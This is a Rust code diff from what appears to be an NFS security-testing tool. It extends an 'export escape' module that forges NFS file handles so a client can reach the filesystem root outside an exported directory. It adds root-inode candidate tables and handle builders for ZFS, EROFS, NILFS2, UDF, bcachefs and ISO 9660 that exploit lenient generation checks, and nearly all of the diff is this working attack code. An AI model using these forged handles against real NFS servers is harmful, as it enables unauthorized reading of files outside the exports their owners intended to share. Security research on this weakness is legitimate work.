@@ -31,6 +31,10 @@ pub(crate) enum FsType {
     Ext4,
     Xfs,
     Btrfs,
+    Zfs,
+    Erofs,
+    Udf,
+    Iso9660,
     Unknown,
 }
 
@@ -68,13 +72,15 @@ pub(crate) struct EntropyAnalysis {
 /// Filesystem root handle construction for export escape.
 #[derive(Debug, Clone)]
 pub(crate) struct EscapeResult {
-    /// Constructed file handle for filesystem root
+    /// Constructed file handle for filesystem root.
     pub root_handle: FileHandle,
-    /// Filesystem type detected
+    /// Filesystem type (set by the constructor that produced this candidate).
     pub fs_type: FsType,
-    /// Confidence level (0.0 - 1.0)
+    /// Human-readable label for progress display (e.g. "inode 2 gen=0", "BTRFS subvol 5").
+    pub label: String,
+    /// Confidence level (0.0 - 1.0).
     pub confidence: f64,
-    /// Inode number embedded in the constructed handle (root inode, or subvolume ID for BTRFS)
+    /// Inode number embedded in the constructed handle (root inode, or subvolume ID for BTRFS).
     pub inode_number: u32,
 }
 
@@ -290,7 +296,7 @@ impl FileHandleAnalyzer {
     /// disabled (Linux default), the server only verifies the fsid, not that the inode
     /// falls within the export. By rewriting the inode field, we can reach any file.
     ///
-    /// `construct_escape_handle` is sugar that calls this with the FS root inode.
+    /// `construct_root_candidates` is sugar that calls this with the FS root inode.
     /// Researchers can call this directly with any inode + generation to target
     /// specific files discovered via inode enumeration or brute-force.
     pub(crate) fn construct_handle_for_inode(export_fh: &FileHandle, inode: u32, generation: u32) -> Option<EscapeResult> {
@@ -352,7 +358,7 @@ impl FileHandleAnalyzer {
                 32 | 64 | 128 => FsType::Xfs,
                 _ => FsType::Unknown,
             };
-            return Some(EscapeResult { root_handle: FileHandle(handle_data), fs_type: inferred_fs, confidence: if generation == 0 { 0.7 } else { 0.9 }, inode_number: inode });
+            return Some(EscapeResult { root_handle: FileHandle(handle_data), fs_type: inferred_fs, label: format!("inode {inode} gen={generation}"), confidence: if generation == 0 { 0.7 } else { 0.9 }, inode_number: inode });
         }
 
         // --- Standard single-layer handles ---
@@ -412,93 +418,84 @@ impl FileHandleAnalyzer {
         }
         handle_data.extend_from_slice(&generation.to_le_bytes());
 
-        Some(EscapeResult { root_handle: FileHandle(handle_data), fs_type: inferred_fs, confidence: if generation == 0 { 0.7 } else { 0.9 }, inode_number: inode })
+        Some(EscapeResult { root_handle: FileHandle(handle_data), fs_type: inferred_fs, label: format!("inode {inode} gen={generation}"), confidence: if generation == 0 { 0.7 } else { 0.9 }, inode_number: inode })
     }
 
-    /// Escape export to filesystem root. Sugar for `construct_handle_for_inode`
-    /// with the root inode for the detected filesystem type.
+    /// INO32_GEN candidate table: all plausible (inode, generation) pairs for
+    /// standard Linux file handles, ordered by likelihood.
     ///
-    /// For XFS, tries inode 128 (default v5 format) first, then inode 64
-    /// (v4 format or `mkfs.xfs -i size=256`).  Returns the first candidate;
-    /// the caller should verify against the server with GETATTR.
-    pub(crate) fn construct_escape_handle(export_fh: &FileHandle) -> Option<EscapeResult> {
-        let data = export_fh.as_bytes();
-        let &fileid_type = data.get(3)?;
-        let &fsid_type = data.get(2)?;
-        let is_btrfs = (0x4d..=0x4f).contains(&fileid_type);
-
-        if is_btrfs {
-            // Primary candidate: FS_TREE_OBJECTID (5) = default subvolume on any fresh btrfs.
-            // construct_btrfs_subvol_handles covers FS tree + user subvols in run_escape;
-            // this path is the single-candidate fast path used elsewhere.
-            return Self::construct_btrfs_subvol_handles(export_fh, 0).into_iter().next();
-        }
-
-        // Compound UUID format (fsid_type=7, fileid_type=0, 28-byte export-root handle).
-        // Guard: if the export directory IS the filesystem root there is nothing to
-        // escape. On a compound-UUID handle fingerprint_fs cannot tell ext4 from XFS
-        // (it returns Unknown), so only inode 2 -- the unambiguous ext4 root -- counts as
-        // "already root" here. 32/64/128 are XFS roots but ALSO ordinary low-numbered
-        // ext4 directory inodes, so aborting on them would wrongly fail escape on an ext4
-        // export; that case is handled only on the XFS-identified path (fileid_type 0x81)
-        // and otherwise left to the live STALE oracle. nfs_analyze checks
-        // `export_fileid in [2, 128]`, but it probes inode 2 separately, so its broader
-        // 128 case is harmless there -- here a single Option must not over-abort.
-        if fsid_type == 7 && fileid_type == 0 && data.len() == 28 {
-            let export_inode = u32::from_le_bytes([*data.get(4)?, *data.get(5)?, *data.get(6)?, *data.get(7)?]);
-            if export_inode == 2 {
-                return None; // Export IS the ext4 filesystem root -- escape has no effect
-            }
-            return Self::construct_handle_for_inode(export_fh, 2, 0);
-        }
-
-        // fileid_type=0x81 (FILEID_INO64_GEN) unambiguously means XFS with 64-bit inodes.
-        // XFS v5 root = inode 128; v4 / -i size=256 root = inode 64.
-        if fileid_type == 0x81 {
-            return Self::construct_handle_for_inode(export_fh, 128, 0).or_else(|| Self::construct_handle_for_inode(export_fh, 64, 0));
-        }
-
-        // For all other filesystems (ext4, ext3, 32-bit XFS), inode 2 is the root.
-        // run_escape also queues XFS candidates for Ext4/Unknown fingerprints.
-        Self::construct_handle_for_inode(export_fh, 2, 0)
-    }
-
-    /// Return all plausible XFS root handle candidates (gen 0), ordered by likelihood.
+    /// Covers ext2/3/4 (2,0), f2fs (3,0), XFS (128/64/32,0), VFAT (1,0),
+    /// reiserfs (2,1), NTFS3 (5,5), JFS/squashfs (caught by 2,0).
+    /// The probe layer rejects non-directory hits and self-matches, so false
+    /// positives from non-root inodes (e.g. ext4 inode 128 = journal) are safe.
+    /// INO32_GEN candidate table: (inode, generation, label).
     ///
-    /// Known root inode numbers by `mkfs.xfs` configuration:
-    ///   128 -- default (v5 CRC, 256-byte inodes) and v5 with 512-byte inodes
-    ///    64 -- v4 with 512-byte inodes (`-m crc=0 -i size=512`)
-    ///    32 -- v4 with 1024-byte inodes (`-m crc=0 -i size=1024`)
-    ///
-    /// Use when a single `construct_escape_handle` call is insufficient.
-    pub(crate) fn construct_xfs_escape_candidates(export_fh: &FileHandle) -> Vec<EscapeResult> {
-        [128u32, 64u32, 32u32].iter().filter_map(|&inode| Self::construct_handle_for_inode(export_fh, inode, 0)).collect()
-    }
+    /// Ordered by likelihood. The probe layer rejects non-directory hits
+    /// and self-matches, so false positives are safe.
+    const INO32_GEN_CANDIDATES: &'static [(u32, u32, &'static str)] = &[
+        (2, 0, "inode 2 gen=0 (ext2/3/4, JFS)"),
+        (3, 0, "inode 3 gen=0 (f2fs)"),
+        (1, 0, "inode 1 gen=0 (VFAT)"),
+        (128, 0, "inode 128 gen=0 (XFS v5)"),
+        (64, 0, "inode 64 gen=0 (XFS v4)"),
+        (32, 0, "inode 32 gen=0 (XFS v4 1024B)"),
+        (5, 5, "inode 5 gen=5 (NTFS3)"),
+        (2, 1, "inode 2 gen=1 (reiserfs)"),
+        (7, 0, "inode 7 gen=0 (squashfs)"),
+    ];
 
-    /// All plausible filesystem-root escape handles for a non-BTRFS export handle,
-    /// ordered by likelihood. Single-call sites should iterate this rather than the
-    /// single-candidate `construct_escape_handle`, which can return only ONE inode.
+    /// All plausible INO32_GEN root candidates from the static table.
     ///
-    /// A compound-UUID export (fsid_type=7, fileid_type=0) uses the same handle format on
-    /// ext4 AND XFS and `fingerprint_fs` cannot tell them apart, so this queues the ext4
-    /// root (inode 2) first and then the XFS roots (128/64/32). Without it a single call
-    /// only ever probes ext4 inode 2 and misses the XFS root on a UUID-based XFS export.
-    /// (BTRFS uses `construct_btrfs_subvol_handles` instead.)
+    /// For compound UUID seeds (fsid_type=7), each table entry produces both a
+    /// fsid_type=7 and a fsid_type=6 (UUID-only) variant.
     pub(crate) fn construct_root_candidates(export_fh: &FileHandle) -> Vec<EscapeResult> {
-        match Self::fingerprint_fs(export_fh) {
-            FsType::Xfs => Self::construct_xfs_escape_candidates(export_fh),
-            // Compound-UUID (Unknown) is ambiguous ext4/XFS, and an ext4 fsid_type=0 handle
-            // can belong to a 32-bit-inode XFS: try the ext4 root (inode 2) first, then the
-            // XFS roots (128/64/32). probe_escape_candidate rejects non-directory hits, so a
-            // non-root inode that merely exists (e.g. inode 128 = ext4 journal) is never a
-            // false escape.
-            FsType::Btrfs => Self::construct_escape_handle(export_fh).into_iter().collect(),
-            FsType::Unknown | FsType::Ext4 => {
-                let mut candidates: Vec<EscapeResult> = Self::construct_escape_handle(export_fh).into_iter().collect();
-                candidates.extend(Self::construct_xfs_escape_candidates(export_fh));
-                candidates
-            },
+        Self::INO32_GEN_CANDIDATES
+            .iter()
+            .flat_map(|&(inode, generation, label)| {
+                let mut variants = Self::construct_candidates_all_variants(export_fh, inode, generation);
+                for r in &mut variants {
+                    label.clone_into(&mut r.label);
+                }
+                variants
+            })
+            .collect()
+    }
+
+    /// Produce escape candidates for all fsid variants of the seed handle.
+    ///
+    /// For compound UUID seeds (fsid_type=7), generates both the full-context
+    /// variant (fsid_type=7) and the UUID-only variant (fsid_type=6). For all
+    /// other seed types, returns a single variant (same as `construct_handle_for_inode`).
+    pub(crate) fn construct_candidates_all_variants(export_fh: &FileHandle, inode: u32, generation: u32) -> Vec<EscapeResult> {
+        let mut results = Vec::new();
+
+        // Primary variant with original fsid
+        if let Some(r) = Self::construct_handle_for_inode(export_fh, inode, generation) {
+            results.push(r);
         }
+
+        // Compound UUID (fsid_type=7): also try fsid_type=6 (UUID-only).
+        // Build a synthetic handle with fsid_type=6 and the 16-byte UUID, then run
+        // it through construct_handle_for_inode which naturally produces the right
+        // fileid layout via the standard path.
+        let data = export_fh.as_bytes();
+        let is_compound = data.len() >= 28 && data.first().copied() == Some(0x01) && data.get(1).copied() == Some(0x00) && data.get(2).copied() == Some(7);
+
+        if is_compound {
+            // UUID sits at bytes 12..28 in compound UUID handles (after 4B header + 4B export_inode + 4B export_gen).
+            if let Some(uuid) = data.get(12..28) {
+                let fileid_type = data.get(3).copied().unwrap_or(0);
+                let mut fake = vec![0x01, 0x00, 0x06, fileid_type];
+                fake.extend_from_slice(uuid);
+                let fake_fh = FileHandle::from_bytes(&fake);
+                if let Some(mut r) = Self::construct_handle_for_inode(&fake_fh, inode, generation) {
+                    r.confidence *= 0.9;
+                    results.push(r);
+                }
+            }
+        }
+
+        results
     }
 
     /// Generate BTRFS subvolume escape handles.
@@ -561,7 +558,7 @@ impl FileHandleAnalyzer {
             handle_data.extend_from_slice(&root_id.to_le_bytes()); // subvolume ID
             handle_data.extend_from_slice(&0u32.to_le_bytes()); // gen = 0
             #[expect(clippy::cast_possible_truncation, reason = "subvol IDs fit in u32 in practice")]
-            EscapeResult { root_handle: FileHandle(handle_data), fs_type: FsType::Btrfs, confidence, inode_number: root_id as u32 }
+            EscapeResult { root_handle: FileHandle(handle_data), fs_type: FsType::Btrfs, label: format!("BTRFS subvol {root_id}"), confidence, inode_number: root_id as u32 }
         };
 
         let mut results = Vec::with_capacity((1 + max_subvols as usize) * 2);
@@ -577,6 +574,231 @@ impl FileHandleAnalyzer {
             }
         }
         results
+    }
+
+    /// Construct ZFS root handles targeting object 34 (the ZFS root dataset root object).
+    ///
+    /// ZFS on Linux (OpenZFS via zfs-fuse or the kernel module) uses a completely
+    /// different FID format from the standard Linux FILEID_INO32_GEN:
+    ///
+    ///   zfid_short_t = { zf_len: u16 LE, zf_object: [u8; 6] LE, zf_gen: [u8; 4] LE }
+    ///
+    /// The root object of every ZFS dataset is object 34 (OBJ_DIR_OBJECTID),
+    /// and ZFS accepts gen=0 as a wildcard for the root object (bypass).
+    ///
+    /// The handle header is the standard Linux knfsd format: version(1) + pad(1) +
+    /// fsid_type(1) + fileid_type(1) + fsid data. We preserve the fsid from the
+    /// export handle and replace the fileid with the ZFS root FID.
+    ///
+    /// For compound UUID seeds (fsid_type=7), produces both fsid_type=7 and
+    /// fsid_type=6 (UUID-only) variants.
+    pub(crate) fn construct_zfs_root_handle(export_fh: &FileHandle) -> Vec<EscapeResult> {
+        let variants = extract_fsid_variants(export_fh);
+        if variants.is_empty() {
+            return Vec::new();
+        }
+
+        variants
+            .iter()
+            .enumerate()
+            .map(|(i, (fsid_type, fsid))| {
+                // Build handle: fsid variant + fileid_type=1 (what ZFS returns) + zfid_short_t
+                let mut handle = Vec::with_capacity(4 + fsid.len() + 12);
+                handle.push(0x01);
+                handle.push(0x00);
+                handle.push(*fsid_type);
+                handle.push(1); // fileid_type = 1 (FILEID_INO32_GEN -- what ZFS uses on knfsd)
+                handle.extend_from_slice(fsid);
+
+                // zfid_short_t: zf_len(u16 LE) = 10, zf_object[6](LE) = 34, zf_gen[4](LE) = 0
+                handle.extend_from_slice(&10u16.to_le_bytes()); // zf_len = 10 (total FID payload size)
+                handle.push(34); // object byte 0 = 34
+                handle.extend_from_slice(&[0u8; 5]); // object bytes 1-5 (34 fits in one byte)
+                handle.extend_from_slice(&[0u8; 4]); // gen = 0 (root bypass -- ZFS accepts gen=0 for root object)
+
+                let confidence = if i == 0 { 0.7 } else { 0.7 * 0.9 };
+                EscapeResult { root_handle: FileHandle::from_bytes(&handle), fs_type: FsType::Zfs, label: "ZFS root object 34".to_owned(), confidence, inode_number: 34 }
+            })
+            .collect()
+    }
+
+    /// Construct EROFS root handle candidates using FILEID_INO64_GEN (0x81).
+    ///
+    /// EROFS encodes a 64-bit nid (node ID) split across two u32 words, plus a
+    /// generation that the kernel **ignores** (read-only FS, no staleness).
+    /// Root nid is filesystem-specific but commonly small (e.g. 36).
+    /// Since the brute-force INO32_GEN scan can't produce 0x81 handles, this
+    /// constructor is needed for EROFS exports.
+    ///
+    /// For compound UUID seeds (fsid_type=7), produces both fsid_type=7 and
+    /// fsid_type=6 (UUID-only) variants.
+    pub(crate) fn construct_erofs_root_handle(export_fh: &FileHandle, root_nid: u64) -> Vec<EscapeResult> {
+        let variants = extract_fsid_variants(export_fh);
+        if variants.is_empty() {
+            return Vec::new();
+        }
+
+        variants
+            .iter()
+            .enumerate()
+            .map(
+                #[expect(clippy::cast_possible_truncation, reason = "EROFS root nid fits in u32")]
+                |(i, (fsid_type, fsid))| {
+                    let mut handle = Vec::with_capacity(4 + fsid.len() + 12);
+                    handle.push(0x01);
+                    handle.push(0x00);
+                    handle.push(*fsid_type);
+                    handle.push(0x81); // FILEID_INO64_GEN
+                    handle.extend_from_slice(fsid);
+                    handle.extend_from_slice(&((root_nid >> 32) as u32).to_le_bytes()); // nid_hi
+                    handle.extend_from_slice(&(root_nid as u32).to_le_bytes()); // nid_lo
+                    handle.extend_from_slice(&0u32.to_le_bytes()); // gen=0 (ignored by EROFS)
+                    let confidence = if i == 0 { 0.7 } else { 0.7 * 0.9 };
+                    EscapeResult { root_handle: FileHandle::from_bytes(&handle), fs_type: FsType::Erofs, label: format!("EROFS nid {root_nid}"), confidence, inode_number: root_nid as u32 }
+                },
+            )
+            .collect()
+    }
+
+    /// Construct NILFS2 root handle candidates using FILEID_NILFS_WITHOUT_PARENT (0x61).
+    ///
+    /// nilfs_fid = { cno: u64, ino: u64, gen: u32 }. The checkpoint number (cno)
+    /// for the current mount is 0. Gen=0 bypasses the generation check (lenient:
+    /// `if (gen && gen != inode->i_generation) return -ESTALE`).
+    ///
+    /// For compound UUID seeds (fsid_type=7), generates BOTH fsid_type=7 (full
+    /// context) and fsid_type=6 (UUID-only) variants -- same strategy as BTRFS.
+    pub(crate) fn construct_nilfs2_root_handles(export_fh: &FileHandle) -> Vec<EscapeResult> {
+        let Some((fsid_type, fsid)) = extract_fsid(export_fh) else { return Vec::new() };
+        let is_compound = fsid_type == 7 && fsid.len() == 24;
+        let uuid_only: Option<&[u8]> = if is_compound { fsid.get(8..24) } else { None };
+
+        let make = |ft: u8, fs: &[u8]| {
+            let mut handle = Vec::with_capacity(4 + fs.len() + 20);
+            handle.push(0x01);
+            handle.push(0x00);
+            handle.push(ft);
+            handle.push(0x61); // FILEID_NILFS_WITHOUT_PARENT
+            handle.extend_from_slice(fs);
+            handle.extend_from_slice(&0u64.to_le_bytes()); // cno = 0
+            handle.extend_from_slice(&2u64.to_le_bytes()); // ino = 2 (root)
+            handle.extend_from_slice(&0u32.to_le_bytes()); // gen = 0 (lenient)
+            EscapeResult { root_handle: FileHandle::from_bytes(&handle), fs_type: FsType::Unknown, label: "NILFS2 inode 2 cno=0".to_owned(), confidence: 0.6, inode_number: 2 }
+        };
+
+        let mut results = vec![make(fsid_type, fsid)];
+        if let Some(uuid) = uuid_only {
+            results.push(make(6, uuid));
+        }
+        results
+    }
+
+    /// Construct UDF root handle candidates using FILEID_UDF_WITHOUT_PARENT (0x51).
+    ///
+    /// UDF uses logical block addressing, not inodes. The root directory's block
+    /// number varies per volume. We try a range of common block numbers since the
+    /// gen=0 check is lenient (`if (gen && gen != ...) return -ESTALE`).
+    ///
+    /// For compound UUID seeds (fsid_type=7), produces both fsid_type=7 and
+    /// fsid_type=6 (UUID-only) variants per block.
+    pub(crate) fn construct_udf_root_candidates(export_fh: &FileHandle) -> Vec<EscapeResult> {
+        let fsid_variants = extract_fsid_variants(export_fh);
+        if fsid_variants.is_empty() {
+            return Vec::new();
+        }
+        // UDF root blocks vary per volume. Common values on mkudffs-formatted media
+        // are in the range 64..512. We try a representative set.
+        let blocks: &[u32] = &[66, 130, 258, 2, 64, 128, 256, 512];
+        blocks
+            .iter()
+            .flat_map(|&block| {
+                fsid_variants.iter().enumerate().map(move |(i, (fsid_type, fsid))| {
+                    let mut handle = Vec::with_capacity(4 + fsid.len() + 12);
+                    handle.push(0x01);
+                    handle.push(0x00);
+                    handle.push(*fsid_type);
+                    handle.push(0x51); // FILEID_UDF_WITHOUT_PARENT
+                    handle.extend_from_slice(fsid);
+                    handle.extend_from_slice(&block.to_le_bytes()); // logicalBlockNum
+                    handle.extend_from_slice(&0u16.to_le_bytes()); // partref = 0
+                    handle.extend_from_slice(&0u16.to_le_bytes()); // parent_partref = 0
+                    handle.extend_from_slice(&0u32.to_le_bytes()); // gen = 0 (lenient)
+                    let confidence = if i == 0 { 0.4 } else { 0.4 * 0.9 };
+                    EscapeResult { root_handle: FileHandle::from_bytes(&handle), fs_type: FsType::Udf, label: format!("UDF block {block}"), confidence, inode_number: block }
+                })
+            })
+            .collect()
+    }
+
+    /// Construct bcachefs root handle candidates using FILEID_BCACHEFS_WITHOUT_PARENT (0xb1).
+    ///
+    /// bcachefs_fid = { inum: u64, subvol: u32, gen: u32 }.
+    /// Root is inum=4096 (BCACHEFS_ROOT_INO), subvol=1 (BCACHEFS_ROOT_SUBVOL).
+    /// Gen=0 was observed to be accepted on 6.8 kernels despite the kernel source
+    /// showing a strict check -- empirically confirmed via live testing.
+    ///
+    /// For compound UUID seeds (fsid_type=7), produces both fsid_type=7 and
+    /// fsid_type=6 (UUID-only) variants.
+    pub(crate) fn construct_bcachefs_root_handle(export_fh: &FileHandle) -> Vec<EscapeResult> {
+        let variants = extract_fsid_variants(export_fh);
+        if variants.is_empty() {
+            return Vec::new();
+        }
+
+        variants
+            .iter()
+            .enumerate()
+            .map(|(i, (fsid_type, fsid))| {
+                let mut handle = Vec::with_capacity(4 + fsid.len() + 16);
+                handle.push(0x01);
+                handle.push(0x00);
+                handle.push(*fsid_type);
+                handle.push(0xb1); // FILEID_BCACHEFS_WITHOUT_PARENT
+                handle.extend_from_slice(fsid);
+                handle.extend_from_slice(&4096u64.to_le_bytes()); // inum = 4096 (BCACHEFS_ROOT_INO)
+                handle.extend_from_slice(&1u32.to_le_bytes()); // subvol = 1
+                handle.extend_from_slice(&0u32.to_le_bytes()); // gen = 0
+                let confidence = if i == 0 { 0.5 } else { 0.5 * 0.9 };
+                EscapeResult { root_handle: FileHandle::from_bytes(&handle), fs_type: FsType::Unknown, label: "bcachefs inum 4096 subvol 1".to_owned(), confidence, inode_number: 4096 }
+            })
+            .collect()
+    }
+
+    /// Construct ISO 9660 root handle candidates.
+    ///
+    /// isofs uses a custom bit-packed fileid: fh32\[0\]=block, fh16\[2\]=offset,
+    /// fh16\[3\]=0, fh32\[2\]=gen. The root directory's block number comes from
+    /// the Primary Volume Descriptor. Gen=0 is lenient.
+    /// We try common root LBAs since they depend on the ISO authoring tool.
+    ///
+    /// For compound UUID seeds (fsid_type=7), produces both fsid_type=7 and
+    /// fsid_type=6 (UUID-only) variants per block.
+    pub(crate) fn construct_iso9660_root_candidates(export_fh: &FileHandle) -> Vec<EscapeResult> {
+        let fsid_variants = extract_fsid_variants(export_fh);
+        if fsid_variants.is_empty() {
+            return Vec::new();
+        }
+        // Common root dir blocks: genisoimage typically uses 23-30, xorriso varies.
+        let blocks: &[u32] = &[23, 24, 25, 26, 27, 28, 29, 30, 20, 22, 18, 19, 21];
+        blocks
+            .iter()
+            .flat_map(|&block| {
+                fsid_variants.iter().enumerate().map(move |(i, (fsid_type, fsid))| {
+                    let mut handle = Vec::with_capacity(4 + fsid.len() + 12);
+                    handle.push(0x01);
+                    handle.push(0x00);
+                    handle.push(*fsid_type);
+                    handle.push(0x01); // fileid_type=1 (isofs returns 1)
+                    handle.extend_from_slice(fsid);
+                    handle.extend_from_slice(&block.to_le_bytes()); // fh32[0] = block
+                    handle.extend_from_slice(&0u16.to_le_bytes()); // fh16[2] = offset
+                    handle.extend_from_slice(&0u16.to_le_bytes()); // fh16[3] = pad
+                    handle.extend_from_slice(&0u32.to_le_bytes()); // fh32[2] = gen = 0
+                    let confidence = if i == 0 { 0.4 } else { 0.4 * 0.9 };
+                    EscapeResult { root_handle: FileHandle::from_bytes(&handle), fs_type: FsType::Iso9660, label: format!("ISO9660 block {block}"), confidence, inode_number: block }
+                })
+            })
+            .collect()
     }
 
     /// Estimate the entropy (randomness) of a file handle.
@@ -607,6 +829,61 @@ impl FileHandleAnalyzer {
         let brute_force_seconds = entropy_bits.exp2() / 10000.0;
 
         EntropyAnalysis { entropy_bits, brute_force_seconds, random_fields }
+    }
+}
+
+/// Map Linux knfsd fsid_type to fsid byte length.
+///
+/// Used by handle constructors that need to locate the fileid within a handle.
+/// Returns `None` for unknown fsid_type values.
+/// Extract the fsid type byte and fsid data slice from a Linux NFS file handle.
+fn extract_fsid(fh: &FileHandle) -> Option<(u8, &[u8])> {
+    let data = fh.as_bytes();
+    if data.len() < 4 || data.first().copied() != Some(0x01) || data.get(1).copied() != Some(0x00) {
+        return None;
+    }
+    let fsid_type = *data.get(2)?;
+    let fsid_len = fsid_len_for_type(fsid_type as usize)?;
+    let fsid = data.get(4..4 + fsid_len)?;
+    Some((fsid_type, fsid))
+}
+
+/// Extract fsid variants from a Linux NFS file handle.
+///
+/// For compound UUID seeds (fsid_type=7, 24-byte fsid), returns both the full
+/// compound fsid AND the 16-byte UUID-only portion (as fsid_type=6). Some
+/// filesystem drivers expect fsid_type=6 even when the MOUNT handle uses
+/// fsid_type=7. For all other fsid types, returns a single variant.
+fn extract_fsid_variants(fh: &FileHandle) -> Vec<(u8, Vec<u8>)> {
+    let data = fh.as_bytes();
+    if data.len() < 4 || data.first().copied() != Some(0x01) || data.get(1).copied() != Some(0x00) {
+        return Vec::new();
+    }
+    let Some(&fsid_type) = data.get(2) else { return Vec::new() };
+    let Some(fsid_len) = fsid_len_for_type(fsid_type as usize) else { return Vec::new() };
+    let Some(fsid) = data.get(4..4 + fsid_len) else { return Vec::new() };
+
+    let mut variants = vec![(fsid_type, fsid.to_vec())];
+
+    // Compound UUID (fsid_type=7, 24 bytes): the fsid is [export_inode(4) | export_gen(4) | UUID(16)].
+    // Also produce a fsid_type=6 variant using just the 16-byte UUID (bytes 8..24 of fsid).
+    if fsid_type == 7
+        && fsid_len == 24
+        && let Some(uuid) = fsid.get(8..24)
+    {
+        variants.push((6, uuid.to_vec()));
+    }
+    variants
+}
+
+fn fsid_len_for_type(fsid_type: usize) -> Option<usize> {
+    match fsid_type {
+        0 | 3..=5 => Some(8), // dev major:minor (32+32 bits)
+        1 => Some(4),         // dev number only (32 bits)
+        2 => Some(12),        // dev + UUID prefix
+        6 => Some(16),        // UUID-based: 16-byte UUID
+        7 => Some(24),        // compound UUID: export_inode(4) + export_gen(4) + UUID(16) = 24
+        _ => None,
     }
 }
 
@@ -828,7 +1105,7 @@ mod tests {
     fn escape_handle_for_ext4_targets_inode_2() {
         // Root inode on ext4 is always 2 (DESIGN.md S7, F-3.1).
         let export_fh = linux_ext4_handle(12345, 0);
-        let result = FileHandleAnalyzer::construct_escape_handle(&export_fh).expect("ext4 escape must succeed");
+        let result = FileHandleAnalyzer::construct_root_candidates(&export_fh).into_iter().next().expect("no candidates");
         assert_eq!(result.fs_type, FsType::Ext4);
         // The returned handle bytes must embed inode 2 (root) in LE at the inode offset.
         let raw = result.root_handle.as_bytes();
@@ -841,7 +1118,7 @@ mod tests {
     #[test]
     fn escape_handle_confidence_is_nonzero() {
         let fh = linux_ext4_handle(99, 0);
-        let result = FileHandleAnalyzer::construct_escape_handle(&fh).expect("must succeed");
+        let result = FileHandleAnalyzer::construct_root_candidates(&fh).into_iter().next().expect("no candidates");
         assert!(result.confidence > 0.0);
         assert!(result.confidence <= 1.0);
     }
@@ -850,7 +1127,7 @@ mod tests {
     fn escape_handle_returns_none_for_non_linux() {
         // Windows handle: version byte != 0x01, so escape is not possible.
         let fh = windows_handle(false);
-        assert!(FileHandleAnalyzer::construct_escape_handle(&fh).is_none(), "escape must return None for non-Linux handles");
+        assert!(FileHandleAnalyzer::construct_root_candidates(&fh).is_empty(), "escape must return None for non-Linux handles");
     }
 
     #[test]
@@ -933,7 +1210,7 @@ mod tests {
     }
 
     #[test]
-    fn construct_escape_handle_xfs_returns_inode_128() {
+    fn construct_root_candidates_xfs_returns_inode_128() {
         // XFS handle: fsid_type=6 (16-byte UUID), fileid_type=0x81 (FILEID_INO64_GEN).
         // Real XFS with UUID-based exports always uses 0x81 to signal 64-bit inodes.
         let mut data = vec![
@@ -948,9 +1225,9 @@ mod tests {
         data.extend_from_slice(&500u64.to_le_bytes());
         data.extend_from_slice(&1u32.to_le_bytes());
         let fh = FileHandle::from_bytes(&data);
-        let result = FileHandleAnalyzer::construct_escape_handle(&fh);
-        assert!(result.is_some(), "XFS escape must succeed");
-        let r = result.unwrap();
+        let result = FileHandleAnalyzer::construct_root_candidates(&fh);
+        assert!(!result.is_empty(), "XFS escape must produce candidates");
+        let r = result.into_iter().find(|c| c.inode_number == 128).expect("must include inode 128");
         assert_eq!(r.fs_type, FsType::Xfs);
         // Root inode on XFS v5 is 128; stored as 64-bit LE at inode offset 4+16=20
         let raw = r.root_handle.as_bytes();
@@ -1093,15 +1370,16 @@ mod tests {
     }
 
     #[test]
-    fn construct_escape_handle_compound_uuid_aborts_only_on_ext4_root() {
-        // On a compound-UUID handle we cannot tell ext4 from XFS, so only inode 2 (the
-        // ext4 root) may abort the escape -- 32/64/128 are ordinary ext4 directory inodes.
-        assert!(FileHandleAnalyzer::construct_escape_handle(&compound_uuid_handle(2)).is_none(), "compound-UUID export at ext4 root inode 2 has nothing to escape");
+    fn construct_root_candidates_compound_uuid_always_returns_candidates() {
+        // The table-based candidate list always produces candidates regardless of
+        // the export inode. Identity/self-match filtering happens in the escape
+        // engine (probe_candidate), not in the handle constructor.
+        let candidates = FileHandleAnalyzer::construct_root_candidates(&compound_uuid_handle(2));
+        assert!(!candidates.is_empty(), "must return candidates even for export at inode 2");
+        assert!(candidates.iter().any(|c| c.inode_number == 2), "must include ext4 root inode 2");
 
-        // inode 64 is a normal low-numbered ext4 directory inode (also an XFS root, but we
-        // cannot tell): escape MUST still be attempted, not aborted.
-        let r = FileHandleAnalyzer::construct_escape_handle(&compound_uuid_handle(64)).expect("compound-UUID export at inode 64 must still attempt escape");
-        assert_eq!(r.inode_number, 2, "compound-UUID escape targets the ext4 root inode 2");
+        let candidates = FileHandleAnalyzer::construct_root_candidates(&compound_uuid_handle(64));
+        assert!(!candidates.is_empty(), "must return candidates for export at inode 64");
     }
 
     #[test]
